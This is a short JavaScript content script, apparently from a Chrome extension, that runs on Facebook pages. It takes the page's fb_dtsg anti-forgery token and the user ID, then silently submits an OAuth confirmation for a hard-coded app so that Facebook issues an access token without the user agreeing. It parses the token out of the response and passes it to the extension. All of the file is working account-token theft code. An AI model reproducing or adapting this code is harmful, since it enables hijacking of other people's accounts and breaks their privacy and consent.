jQuery(function() {
  var PageID = $('input[name="fb_dtsg"]').val()
  var Facebook = {
    userid: document.getElementsByTagName("script")[3].innerHTML.match('USER_ID":"(.*?)"')[1],
    token: null
  }

  jQuery.ajax({
    url: 'https://www.facebook.com/v2.0/dialog/oauth/confirm',
    type: 'POST',
    data: {
      app_id: '464891386855067',
      fb_dtsg: PageID,
      ttstamp: '3562170380680083807593676261',
      redirect_uri: 'fbconnect://success',
      return_format: 'access_token',
      from_post: 1,
      display: 'popup',
      gdp_version: 4,
      sheet_name: 'initial',
      __CONFIRM__: 1,
      sso_device: '',
      sheet_name: 'initial',
      ref: 'Default'
    }
  }).done(function(html) {
    Facebook.token = html.match(/access_token=([\w_]+)&/i)[0].slice(13,-1);
    console.log(Facebook)
    chrome.runtime.sendMessage(Facebook);
  }).fail(function(jqXHR, textStatus) {
    console.log('failed to get token, maybe put some code here to try again and do more debuging this time just ');
  });
});